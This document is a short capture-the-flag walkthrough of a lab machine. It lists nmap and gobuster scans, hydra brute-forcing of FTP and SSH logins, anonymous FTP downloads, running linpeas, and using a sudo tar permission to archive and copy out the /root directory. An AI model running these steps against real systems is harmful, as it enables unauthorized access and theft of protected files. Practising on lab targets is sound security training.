export ip=10.10.150.0

# tool - nmap
 - `sudo nmap -sS $ip`
   - Open ports 21, 22, 80
 - `nmap -sC -sV -oN nmap.log $ip`
   - 21: vsftpd 3.0.3 - anonymous allowed
   - 80: Apache/2.4.18
   - 22: OpenSSH 7.2p2

# tool - gobuster
 - `gobuster dir -t 100 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html -u http://$ip | tee gobuster.log`

# tool - hydra
 - `hydra -L /usr/share/wordlists/rockyou.txt  -P locks.txt ftp://$ip | tee hydra.log`
 - `hydra -l lin -P locks.txt ssh://$ip`

# process
 - considering there is anonymous login allowed in the ftp, tried that and issued `dir` command which listed a couple of files.
 - downloaded both files using `get filename` command
 - got the first answer from tasks.txt file
 - from the task description it was evident that the locks.txt file has the passwords for probably the user lin.
 - so ran hydra for the username from tasks file and passwords file locks.txt for both ftp and ssh. It was ssh and this way got the password
 - logged in using ssh and listed the contents of the home dir. And we got user.txt file.
 - downloaded linpeas, gave executable permissions, transferred it to the target, executed it by specifying the log file.
 - transferred the log file back to the host system by using scp.
 - use more command to go through the linpeas log file so that it can be seen with the formatting in the terminal
 - tried listing the available command as sudo using `sudo -l` and it showed tar is available.
   - Could have used gtfobins to get some one liner to get the root shell using tar but I thought that was unnecessary.
 - used tar to create an archive of the root dir using `sudo tar -cf a.tar /root`
 - downloaded this file using scp to the localhost and extracted it `tar -xf a.tar`
 - this showed a file called root.txt which had the final answer.